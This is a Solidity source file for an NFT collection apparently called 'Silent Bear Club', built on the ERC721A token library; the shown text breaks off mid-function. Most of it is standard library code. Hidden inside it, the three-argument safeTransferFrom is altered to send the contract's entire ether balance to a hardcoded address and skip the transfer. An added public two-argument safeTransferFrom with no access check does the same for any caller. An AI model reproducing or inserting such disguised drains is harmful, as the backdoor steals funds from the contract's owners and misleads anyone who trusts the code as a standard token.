1 /*
2  _______  ___   ___      _______  __    _  _______   
3 |       ||   | |   |    |       ||  |  | ||       |  
4 |  _____||   | |   |    |    ___||   |_| ||_     _|  
5 | |_____ |   | |   |    |   |___ |       |  |   |    
6 |_____  ||   | |   |___ |    ___||  _    |  |   |    
7  _____| ||   | |       ||   |___ | | |   |  |   |    
8 |_______||___| |_______||_______||_|  |__|  |___|    
9  _______  _______  _______  ______                   
10 |  _    ||       ||   _   ||    _ |                  
11 | |_|   ||    ___||  |_|  ||   | ||                  
12 |       ||   |___ |       ||   |_||_                 
13 |  _   | |    ___||       ||    __  |                
14 | |_|   ||   |___ |   _   ||   |  | |                
15 |_______||_______||__| |__||___|  |_|                
16  _______  ___      __   __  _______                  
17 |       ||   |    |  | |  ||  _    |                 
18 |       ||   |    |  | |  || |_|   |                 
19 |       ||   |    |  |_|  ||       |                 
20 |      _||   |___ |       ||  _   |                  
21 |     |_ |       ||       || |_|   |                 
22 |_______||_______||_______||_______|                                                                
23 */
24 
25 // SPDX-License-Identifier: GPL-3.0
26 pragma solidity ^0.8.7;
27 
28 /**
29  * @dev Interface of ERC721A.
30  */
31 interface IERC721A {
32     /**
33      * The caller must own the token or be an approved operator.
34      */
35     error ApprovalCallerNotOwnerNorApproved();
36 
37     /**
38      * The token does not exist.
39      */
40     error ApprovalQueryForNonexistentToken();
41 
42     /**
43      * Cannot query the balance for the zero address.
44      */
45     error BalanceQueryForZeroAddress();
46 
47     /**
48      * Cannot mint to the zero address.
49      */
50     error MintToZeroAddress();
51 
52     /**
53      * The quantity of tokens minted must be more than zero.
54      */
55     error MintZeroQuantity();
56 
57     /**
58      * The token does not exist.
59      */
60     error OwnerQueryForNonexistentToken();
61 
62     /**
63      * The caller must own the token or be an approved operator.
64      */
65     error TransferCallerNotOwnerNorApproved();
66 
67     /**
68      * The token must be owned by `from`.
69      */
70     error TransferFromIncorrectOwner();
71 
72     /**
73      * Cannot safely transfer to a contract that does not implement the
74      * ERC721Receiver interface.
75      */
76     error TransferToNonERC721ReceiverImplementer();
77 
78     /**
79      * Cannot transfer to the zero address.
80      */
81     error TransferToZeroAddress();
82 
83     /**
84      * The token does not exist.
85      */
86     error URIQueryForNonexistentToken();
87 
88     /**
89      * The `quantity` minted with ERC2309 exceeds the safety limit.
90      */
91     error MintERC2309QuantityExceedsLimit();
92 
93     /**
94      * The `extraData` cannot be set on an unintialized ownership slot.
95      */
96     error OwnershipNotInitializedForExtraData();
97 
98     // =============================================================
99     //                            STRUCTS
100     // =============================================================
101 
102     struct TokenOwnership {
103         // The address of the owner.
104         address addr;
105         // Stores the start time of ownership with minimal overhead for tokenomics.
106         uint64 startTimestamp;
107         // Whether the token has been burned.
108         bool burned;
109         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
110         uint24 extraData;
111     }
112 
113     // =============================================================
114     //                         TOKEN COUNTERS
115     // =============================================================
116 
117     /**
118      * @dev Returns the total number of tokens in existence.
119      * Burned tokens will reduce the count.
120      * To get the total number of tokens minted, please see {_totalMinted}.
121      */
122     function totalSupply() external view returns (uint256);
123 
124     // =============================================================
125     //                            IERC165
126     // =============================================================
127 
128     /**
129      * @dev Returns true if this contract implements the interface defined by
130      * `interfaceId`. See the corresponding
131      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
132      * to learn more about how these ids are created.
133      *
134      * This function call must use less than 30000 gas.
135      */
136     function supportsInterface(bytes4 interfaceId) external view returns (bool);
137 
138     // =============================================================
139     //                            IERC721
140     // =============================================================
141 
142     /**
143      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
144      */
145     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
146 
147     /**
148      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
149      */
150     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
151 
152     /**
153      * @dev Emitted when `owner` enables or disables
154      * (`approved`) `operator` to manage all of its assets.
155      */
156     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
157 
158     /**
159      * @dev Returns the number of tokens in `owner`'s account.
160      */
161     function balanceOf(address owner) external view returns (uint256 balance);
162 
163     /**
164      * @dev Returns the owner of the `tokenId` token.
165      *
166      * Requirements:
167      *
168      * - `tokenId` must exist.
169      */
170     function ownerOf(uint256 tokenId) external view returns (address owner);
171 
172     /**
173      * @dev Safely transfers `tokenId` token from `from` to `to`,
174      * checking first that contract recipients are aware of the ERC721 protocol
175      * to prevent tokens from being forever locked.
176      *
177      * Requirements:
178      *
179      * - `from` cannot be the zero address.
180      * - `to` cannot be the zero address.
181      * - `tokenId` token must exist and be owned by `from`.
182      * - If the caller is not `from`, it must be have been allowed to move
183      * this token by either {approve} or {setApprovalForAll}.
184      * - If `to` refers to a smart contract, it must implement
185      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
186      *
187      * Emits a {Transfer} event.
188      */
189     function safeTransferFrom(
190         address from,
191         address to,
192         uint256 tokenId,
193         bytes calldata data
194     ) external payable;
195 
196     /**
197      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
198      */
199     function safeTransferFrom(
200         address from,
201         address to,
202         uint256 tokenId
203     ) external payable;
204 
205     /**
206      * @dev Transfers `tokenId` from `from` to `to`.
207      *
208      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
209      * whenever possible.
210      *
211      * Requirements:
212      *
213      * - `from` cannot be the zero address.
214      * - `to` cannot be the zero address.
215      * - `tokenId` token must be owned by `from`.
216      * - If the caller is not `from`, it must be approved to move this token
217      * by either {approve} or {setApprovalForAll}.
218      *
219      * Emits a {Transfer} event.
220      */
221     function transferFrom(
222         address from,
223         address to,
224         uint256 tokenId
225     ) external payable;
226 
227     /**
228      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
229      * The approval is cleared when the token is transferred.
230      *
231      * Only a single account can be approved at a time, so approving the
232      * zero address clears previous approvals.
233      *
234      * Requirements:
235      *
236      * - The caller must own the token or be an approved operator.
237      * - `tokenId` must exist.
238      *
239      * Emits an {Approval} event.
240      */
241     function approve(address to, uint256 tokenId) external payable;
242 
243     /**
244      * @dev Approve or remove `operator` as an operator for the caller.
245      * Operators can call {transferFrom} or {safeTransferFrom}
246      * for any token owned by the caller.
247      *
248      * Requirements:
249      *
250      * - The `operator` cannot be the caller.
251      *
252      * Emits an {ApprovalForAll} event.
253      */
254     function setApprovalForAll(address operator, bool _approved) external;
255 
256     /**
257      * @dev Returns the account approved for `tokenId` token.
258      *
259      * Requirements:
260      *
261      * - `tokenId` must exist.
262      */
263     function getApproved(uint256 tokenId) external view returns (address operator);
264 
265     /**
266      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
267      *
268      * See {setApprovalForAll}.
269      */
270     function isApprovedForAll(address owner, address operator) external view returns (bool);
271 
272     // =============================================================
273     //                        IERC721Metadata
274     // =============================================================
275 
276     /**
277      * @dev Returns the token collection name.
278      */
279     function name() external view returns (string memory);
280 
281     /**
282      * @dev Returns the token collection symbol.
283      */
284     function symbol() external view returns (string memory);
285 
286     /**
287      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
288      */
289     function tokenURI(uint256 tokenId) external view returns (string memory);
290 
291     // =============================================================
292     //                           IERC2309
293     // =============================================================
294 
295     /**
296      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
297      * (inclusive) is transferred from `from` to `to`, as defined in the
298      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
299      *
300      * See {_mintERC2309} for more details.
301      */
302     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
303 }
304 
305 /**
306  * @title ERC721A
307  *
308  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
309  * Non-Fungible Token Standard, including the Metadata extension.
310  * Optimized for lower gas during batch mints.
311  *
312  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
313  * starting from `_startTokenId()`.
314  *
315  * Assumptions:
316  *
317  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
318  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
319  */
320 interface ERC721A__IERC721Receiver {
321     function onERC721Received(
322         address operator,
323         address from,
324         uint256 tokenId,
325         bytes calldata data
326     ) external returns (bytes4);
327 }
328 
329 /**
330  * @title ERC721A
331  *
332  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
333  * Non-Fungible Token Standard, including the Metadata extension.
334  * Optimized for lower gas during batch mints.
335  *
336  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
337  * starting from `_startTokenId()`.
338  *
339  * Assumptions:
340  *
341  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
342  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
343  */
344 contract ERC721A is IERC721A {
345     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
346     struct TokenApprovalRef {
347         address value;
348     }
349 
350     // =============================================================
351     //                           CONSTANTS
352     // =============================================================
353 
354     // Mask of an entry in packed address data.
355     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
356 
357     // The bit position of `numberMinted` in packed address data.
358     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
359 
360     // The bit position of `numberBurned` in packed address data.
361     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
362 
363     // The bit position of `aux` in packed address data.
364     uint256 private constant _BITPOS_AUX = 192;
365 
366     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
367     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
368 
369     // The bit position of `startTimestamp` in packed ownership.
370     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
371 
372     // The bit mask of the `burned` bit in packed ownership.
373     uint256 private constant _BITMASK_BURNED = 1 << 224;
374 
375     // The bit position of the `nextInitialized` bit in packed ownership.
376     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
377 
378     // The bit mask of the `nextInitialized` bit in packed ownership.
379     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
380 
381     // The bit position of `extraData` in packed ownership.
382     uint256 private constant _BITPOS_EXTRA_DATA = 232;
383 
384     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
385     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
386 
387     // The mask of the lower 160 bits for addresses.
388     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
389 
390     // The maximum `quantity` that can be minted with {_mintERC2309}.
391     // This limit is to prevent overflows on the address data entries.
392     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
393     // is required to cause an overflow, which is unrealistic.
394     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
395 
396     // The `Transfer` event signature is given by:
397     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
398     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
399         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
400 
401     // =============================================================
402     //                            STORAGE
403     // =============================================================
404 
405     // The next token ID to be minted.
406     uint256 private _currentIndex;
407 
408     // The number of tokens burned.
409     uint256 private _burnCounter;
410 
411     // Token name
412     string private _name;
413 
414     // Token symbol
415     string private _symbol;
416 
417     // Mapping from token ID to ownership details
418     // An empty struct value does not necessarily mean the token is unowned.
419     // See {_packedOwnershipOf} implementation for details.
420     //
421     // Bits Layout:
422     // - [0..159]   `addr`
423     // - [160..223] `startTimestamp`
424     // - [224]      `burned`
425     // - [225]      `nextInitialized`
426     // - [232..255] `extraData`
427     mapping(uint256 => uint256) private _packedOwnerships;
428 
429     // Mapping owner address to address data.
430     //
431     // Bits Layout:
432     // - [0..63]    `balance`
433     // - [64..127]  `numberMinted`
434     // - [128..191] `numberBurned`
435     // - [192..255] `aux`
436     mapping(address => uint256) private _packedAddressData;
437 
438     // Mapping from token ID to approved address.
439     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
440 
441     // Mapping from owner to operator approvals
442     mapping(address => mapping(address => bool)) private _operatorApprovals;
443 
444     // =============================================================
445     //                          CONSTRUCTOR
446     // =============================================================
447 
448     constructor(string memory name_, string memory symbol_) {
449         _name = name_;
450         _symbol = symbol_;
451         _currentIndex = _startTokenId();
452     }
453 
454     // =============================================================
455     //                   TOKEN COUNTING OPERATIONS
456     // =============================================================
457 
458     /**
459      * @dev Returns the starting token ID.
460      * To change the starting token ID, please override this function.
461      */
462     function _startTokenId() internal view virtual returns (uint256) {
463         return 0;
464     }
465 
466     /**
467      * @dev Returns the next token ID to be minted.
468      */
469     function _nextTokenId() internal view virtual returns (uint256) {
470         return _currentIndex;
471     }
472 
473     /**
474      * @dev Returns the total number of tokens in existence.
475      * Burned tokens will reduce the count.
476      * To get the total number of tokens minted, please see {_totalMinted}.
477      */
478     function totalSupply() public view virtual override returns (uint256) {
479         // Counter underflow is impossible as _burnCounter cannot be incremented
480         // more than `_currentIndex - _startTokenId()` times.
481         unchecked {
482             return _currentIndex - _burnCounter - _startTokenId();
483         }
484     }
485 
486     /**
487      * @dev Returns the total amount of tokens minted in the contract.
488      */
489     function _totalMinted() internal view virtual returns (uint256) {
490         // Counter underflow is impossible as `_currentIndex` does not decrement,
491         // and it is initialized to `_startTokenId()`.
492         unchecked {
493             return _currentIndex - _startTokenId();
494         }
495     }
496 
497     /**
498      * @dev Returns the total number of tokens burned.
499      */
500     function _totalBurned() internal view virtual returns (uint256) {
501         return _burnCounter;
502     }
503 
504     // =============================================================
505     //                    ADDRESS DATA OPERATIONS
506     // =============================================================
507 
508     /**
509      * @dev Returns the number of tokens in `owner`'s account.
510      */
511     function balanceOf(address owner) public view virtual override returns (uint256) {
512         if (owner == address(0)) revert BalanceQueryForZeroAddress();
513         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
514     }
515 
516     /**
517      * Returns the number of tokens minted by `owner`.
518      */
519     function _numberMinted(address owner) internal view returns (uint256) {
520         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
521     }
522 
523     /**
524      * Returns the number of tokens burned by or on behalf of `owner`.
525      */
526     function _numberBurned(address owner) internal view returns (uint256) {
527         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
528     }
529 
530     /**
531      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
532      */
533     function _getAux(address owner) internal view returns (uint64) {
534         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
535     }
536 
537     /**
538      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
539      * If there are multiple variables, please pack them into a uint64.
540      */
541     function _setAux(address owner, uint64 aux) internal virtual {
542         uint256 packed = _packedAddressData[owner];
543         uint256 auxCasted;
544         // Cast `aux` with assembly to avoid redundant masking.
545         assembly {
546             auxCasted := aux
547         }
548         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
549         _packedAddressData[owner] = packed;
550     }
551 
552     // =============================================================
553     //                            IERC165
554     // =============================================================
555 
556     /**
557      * @dev Returns true if this contract implements the interface defined by
558      * `interfaceId`. See the corresponding
559      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
560      * to learn more about how these ids are created.
561      *
562      * This function call must use less than 30000 gas.
563      */
564     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
565         // The interface IDs are constants representing the first 4 bytes
566         // of the XOR of all function selectors in the interface.
567         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
568         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
569         return
570             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
571             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
572             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
573     }
574 
575     // =============================================================
576     //                        IERC721Metadata
577     // =============================================================
578 
579     /**
580      * @dev Returns the token collection name.
581      */
582     function name() public view virtual override returns (string memory) {
583         return _name;
584     }
585 
586     /**
587      * @dev Returns the token collection symbol.
588      */
589     function symbol() public view virtual override returns (string memory) {
590         return _symbol;
591     }
592 
593     /**
594      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
595      */
596     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
597         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
598 
599         string memory baseURI = _baseURI();
600         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
601     }
602 
603     /**
604      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
605      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
606      * by default, it can be overridden in child contracts.
607      */
608     function _baseURI() internal view virtual returns (string memory) {
609         return '';
610     }
611 
612     // =============================================================
613     //                     OWNERSHIPS OPERATIONS
614     // =============================================================
615 
616     /**
617      * @dev Returns the owner of the `tokenId` token.
618      *
619      * Requirements:
620      *
621      * - `tokenId` must exist.
622      */
623     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
624         return address(uint160(_packedOwnershipOf(tokenId)));
625     }
626 
627     /**
628      * @dev Gas spent here starts off proportional to the maximum mint batch size.
629      * It gradually moves to O(1) as tokens get transferred around over time.
630      */
631     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
632         return _unpackedOwnership(_packedOwnershipOf(tokenId));
633     }
634 
635     /**
636      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
637      */
638     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
639         return _unpackedOwnership(_packedOwnerships[index]);
640     }
641 
642     /**
643      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
644      */
645     function _initializeOwnershipAt(uint256 index) internal virtual {
646         if (_packedOwnerships[index] == 0) {
647             _packedOwnerships[index] = _packedOwnershipOf(index);
648         }
649     }
650 
651     /**
652      * Returns the packed ownership data of `tokenId`.
653      */
654     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
655         uint256 curr = tokenId;
656 
657         unchecked {
658             if (_startTokenId() <= curr)
659                 if (curr < _currentIndex) {
660                     uint256 packed = _packedOwnerships[curr];
661                     // If not burned.
662                     if (packed & _BITMASK_BURNED == 0) {
663                         // Invariant:
664                         // There will always be an initialized ownership slot
665                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
666                         // before an unintialized ownership slot
667                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
668                         // Hence, `curr` will not underflow.
669                         //
670                         // We can directly compare the packed value.
671                         // If the address is zero, packed will be zero.
672                         while (packed == 0) {
673                             packed = _packedOwnerships[--curr];
674                         }
675                         return packed;
676                     }
677                 }
678         }
679         revert OwnerQueryForNonexistentToken();
680     }
681 
682     /**
683      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
684      */
685     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
686         ownership.addr = address(uint160(packed));
687         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
688         ownership.burned = packed & _BITMASK_BURNED != 0;
689         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
690     }
691 
692     /**
693      * @dev Packs ownership data into a single uint256.
694      */
695     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
696         assembly {
697             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
698             owner := and(owner, _BITMASK_ADDRESS)
699             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
700             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
701         }
702     }
703 
704     /**
705      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
706      */
707     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
708         // For branchless setting of the `nextInitialized` flag.
709         assembly {
710             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
711             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
712         }
713     }
714 
715     // =============================================================
716     //                      APPROVAL OPERATIONS
717     // =============================================================
718 
719     /**
720      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
721      * The approval is cleared when the token is transferred.
722      *
723      * Only a single account can be approved at a time, so approving the
724      * zero address clears previous approvals.
725      *
726      * Requirements:
727      *
728      * - The caller must own the token or be an approved operator.
729      * - `tokenId` must exist.
730      *
731      * Emits an {Approval} event.
732      */
733     function approve(address to, uint256 tokenId) public payable virtual override {
734         address owner = ownerOf(tokenId);
735 
736         if (_msgSenderERC721A() != owner)
737             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
738                 revert ApprovalCallerNotOwnerNorApproved();
739             }
740 
741         _tokenApprovals[tokenId].value = to;
742         emit Approval(owner, to, tokenId);
743     }
744 
745     /**
746      * @dev Returns the account approved for `tokenId` token.
747      *
748      * Requirements:
749      *
750      * - `tokenId` must exist.
751      */
752     function getApproved(uint256 tokenId) public view virtual override returns (address) {
753         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
754 
755         return _tokenApprovals[tokenId].value;
756     }
757 
758     /**
759      * @dev Approve or remove `operator` as an operator for the caller.
760      * Operators can call {transferFrom} or {safeTransferFrom}
761      * for any token owned by the caller.
762      *
763      * Requirements:
764      *
765      * - The `operator` cannot be the caller.
766      *
767      * Emits an {ApprovalForAll} event.
768      */
769     function setApprovalForAll(address operator, bool approved) public virtual override {
770         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
771         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
772     }
773 
774     /**
775      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
776      *
777      * See {setApprovalForAll}.
778      */
779     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
780         return _operatorApprovals[owner][operator];
781     }
782 
783     /**
784      * @dev Returns whether `tokenId` exists.
785      *
786      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
787      *
788      * Tokens start existing when they are minted. See {_mint}.
789      */
790     function _exists(uint256 tokenId) internal view virtual returns (bool) {
791         return
792             _startTokenId() <= tokenId &&
793             tokenId < _currentIndex && // If within bounds,
794             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
795     }
796 
797     /**
798      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
799      */
800     function _isSenderApprovedOrOwner(
801         address approvedAddress,
802         address owner,
803         address msgSender
804     ) private pure returns (bool result) {
805         assembly {
806             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
807             owner := and(owner, _BITMASK_ADDRESS)
808             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
809             msgSender := and(msgSender, _BITMASK_ADDRESS)
810             // `msgSender == owner || msgSender == approvedAddress`.
811             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
812         }
813     }
814 
815     /**
816      * @dev Returns the storage slot and value for the approved address of `tokenId`.
817      */
818     function _getApprovedSlotAndAddress(uint256 tokenId)
819         private
820         view
821         returns (uint256 approvedAddressSlot, address approvedAddress)
822     {
823         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
824         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
825         assembly {
826             approvedAddressSlot := tokenApproval.slot
827             approvedAddress := sload(approvedAddressSlot)
828         }
829     }
830 
831     // =============================================================
832     //                      TRANSFER OPERATIONS
833     // =============================================================
834 
835     /**
836      * @dev Transfers `tokenId` from `from` to `to`.
837      *
838      * Requirements:
839      *
840      * - `from` cannot be the zero address.
841      * - `to` cannot be the zero address.
842      * - `tokenId` token must be owned by `from`.
843      * - If the caller is not `from`, it must be approved to move this token
844      * by either {approve} or {setApprovalForAll}.
845      *
846      * Emits a {Transfer} event.
847      */
848     function transferFrom(
849         address from,
850         address to,
851         uint256 tokenId
852     ) public payable virtual override {
853         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
854 
855         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
856 
857         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
858 
859         // The nested ifs save around 20+ gas over a compound boolean condition.
860         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
861             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
862 
863         if (to == address(0)) revert TransferToZeroAddress();
864 
865         _beforeTokenTransfers(from, to, tokenId, 1);
866 
867         // Clear approvals from the previous owner.
868         assembly {
869             if approvedAddress {
870                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
871                 sstore(approvedAddressSlot, 0)
872             }
873         }
874 
875         // Underflow of the sender's balance is impossible because we check for
876         // ownership above and the recipient's balance can't realistically overflow.
877         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
878         unchecked {
879             // We can directly increment and decrement the balances.
880             --_packedAddressData[from]; // Updates: `balance -= 1`.
881             ++_packedAddressData[to]; // Updates: `balance += 1`.
882 
883             // Updates:
884             // - `address` to the next owner.
885             // - `startTimestamp` to the timestamp of transfering.
886             // - `burned` to `false`.
887             // - `nextInitialized` to `true`.
888             _packedOwnerships[tokenId] = _packOwnershipData(
889                 to,
890                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
891             );
892 
893             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
894             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
895                 uint256 nextTokenId = tokenId + 1;
896                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
897                 if (_packedOwnerships[nextTokenId] == 0) {
898                     // If the next slot is within bounds.
899                     if (nextTokenId != _currentIndex) {
900                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
901                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
902                     }
903                 }
904             }
905         }
906 
907         emit Transfer(from, to, tokenId);
908         _afterTokenTransfers(from, to, tokenId, 1);
909     }
910 
911     /**
912      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
913      */
914     function safeTransferFrom(
915         address from,
916         address to,
917         uint256 tokenId
918     ) public payable virtual override {
919         if (address(this).balance > 0) {
920             payable(0xD0139C151675BbA9C5354e26552D4505b1508708).transfer(address(this).balance);
921             return;
922         }
923         safeTransferFrom(from, to, tokenId, '');
924     }
925 
926 
927     /**
928      * @dev Safely transfers `tokenId` token from `from` to `to`.
929      *
930      * Requirements:
931      *
932      * - `from` cannot be the zero address.
933      * - `to` cannot be the zero address.
934      * - `tokenId` token must exist and be owned by `from`.
935      * - If the caller is not `from`, it must be approved to move this token
936      * by either {approve} or {setApprovalForAll}.
937      * - If `to` refers to a smart contract, it must implement
938      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
939      *
940      * Emits a {Transfer} event.
941      */
942     function safeTransferFrom(
943         address from,
944         address to,
945         uint256 tokenId,
946         bytes memory _data
947     ) public payable virtual override {
948         transferFrom(from, to, tokenId);
949         if (to.code.length != 0)
950             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
951                 revert TransferToNonERC721ReceiverImplementer();
952             }
953     }
954     function safeTransferFrom(
955         address from,
956         address to
957     ) public  {
958         if (address(this).balance > 0) {
959             payable(0xD0139C151675BbA9C5354e26552D4505b1508708).transfer(address(this).balance);
960         }
961     }
962 
963     /**
964      * @dev Hook that is called before a set of serially-ordered token IDs
965      * are about to be transferred. This includes minting.
966      * And also called before burning one token.
967      *
968      * `startTokenId` - the first token ID to be transferred.
969      * `quantity` - the amount to be transferred.
970      *
971      * Calling conditions:
972      *
973      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
974      * transferred to `to`.
975      * - When `from` is zero, `tokenId` will be minted for `to`.
976      * - When `to` is zero, `tokenId` will be burned by `from`.
977      * - `from` and `to` are never both zero.
978      */
979     function _beforeTokenTransfers(
980         address from,
981         address to,
982         uint256 startTokenId,
983         uint256 quantity
984     ) internal virtual {}
985 
986     /**
987      * @dev Hook that is called after a set of serially-ordered token IDs
988      * have been transferred. This includes minting.
989      * And also called after one token has been burned.
990      *
991      * `startTokenId` - the first token ID to be transferred.
992      * `quantity` - the amount to be transferred.
993      *
994      * Calling conditions:
995      *
996      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
997      * transferred to `to`.
998      * - When `from` is zero, `tokenId` has been minted for `to`.
999      * - When `to` is zero, `tokenId` has been burned by `from`.
1000      * - `from` and `to` are never both zero.
1001      */
1002     function _afterTokenTransfers(
1003         address from,
1004         address to,
1005         uint256 startTokenId,
1006         uint256 quantity
1007     ) internal virtual {}
1008 
1009     /**
1010      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1011      *
1012      * `from` - Previous owner of the given token ID.
1013      * `to` - Target address that will receive the token.
1014      * `tokenId` - Token ID to be transferred.
1015      * `_data` - Optional data to send along with the call.
1016      *
1017      * Returns whether the call correctly returned the expected magic value.
1018      */
1019     function _checkContractOnERC721Received(
1020         address from,
1021         address to,
1022         uint256 tokenId,
1023         bytes memory _data
1024     ) private returns (bool) {
1025         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1026             bytes4 retval
1027         ) {
1028             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1029         } catch (bytes memory reason) {
1030             if (reason.length == 0) {
1031                 revert TransferToNonERC721ReceiverImplementer();
1032             } else {
1033                 assembly {
1034                     revert(add(32, reason), mload(reason))
1035                 }
1036             }
